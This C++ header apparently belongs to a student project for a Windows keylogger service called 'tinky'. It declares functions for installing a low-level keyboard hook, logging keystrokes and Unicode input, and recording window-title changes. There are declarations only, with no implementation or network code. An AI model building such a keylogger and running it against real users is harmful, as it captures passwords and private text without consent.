/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   tinky.hpp                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ecaceres <ecaceres@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2023/01/08 17:45:49 by ecaceres          #+#    #+#             */
/*   Updated: 2023/01/08 17:45:49 by ecaceres         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef TINKY_HPP
#define TINKY_HPP

#pragma warning(disable: 5039)
#pragma warning(disable: 4668)

#include <Windows.h>
#include <signal.h>
#include <ctype.h>
#include <string.h>

#include <iostream>
#include <fstream>

#define SERVICE_NAME "tinky"

INT CreateKeyLogger();
VOID DestroyKeyLogger();

BOOL HasWindowTitleChanged();
BOOL ConvertToUTF8(CHAR *buffer, const int codePoint);
BOOL IsAllPrintable(CHAR *buffer, size_t length);

BOOL TryLogUnicode(KBDLLHOOKSTRUCT *pKeyboard);
BOOL TryLogKey(KBDLLHOOKSTRUCT *pKeyboard);

VOID LogWindow();
VOID LogKey(KBDLLHOOKSTRUCT *pKeyboard);

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

void Cleanup();
void HandleSignal(int sig);

#endif
